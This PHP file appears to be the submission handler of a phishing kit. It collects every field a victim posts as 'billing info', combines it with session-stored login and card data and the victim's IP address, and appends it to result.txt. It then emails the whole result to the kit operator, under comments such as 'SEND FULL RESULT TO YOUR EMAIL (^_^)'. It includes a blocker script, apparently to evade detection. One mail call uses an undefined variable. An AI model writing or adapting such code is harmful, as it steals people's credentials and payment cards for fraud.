<?php 
ob_start();
session_start();
include '../../email.php';
include '../asset/php/loca.php';
include '../asset/php/blocker.php';

$line = "##############################";
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$billing = "$line
#BILLING INFO
$line
[Country] => $country
";
foreach($_POST as $var => $val){
	$var2 = str_replace("+"," ",$var);
	$billing .= "[$var2] => $val
";
}
$ip = $_SERVER['REMOTE_ADDR'];
$headers = "From: Crazialism1" . "\r\n";
$subject = "New result (^_^) ($ip)";
$full = $_SESSION['login'].$_SESSION['card'].$billing;
$fp = fopen("../../result.txt",'a');
fwrite($fp, $billing);
mail($fwrite
,$subject,
$full,
$headers
);
fclose($fp);



if($enableMail == 1){
// SEND FULL RESULT TO YOUR EMAIL (^_^). do not change anything !!!
mail($email,$subject,$full,$headers);
// SEND FULL RESULT TO YOUR EMAIL (^_^). do not change anything !!!
}
else{
	return false;
}


exit();
}

?>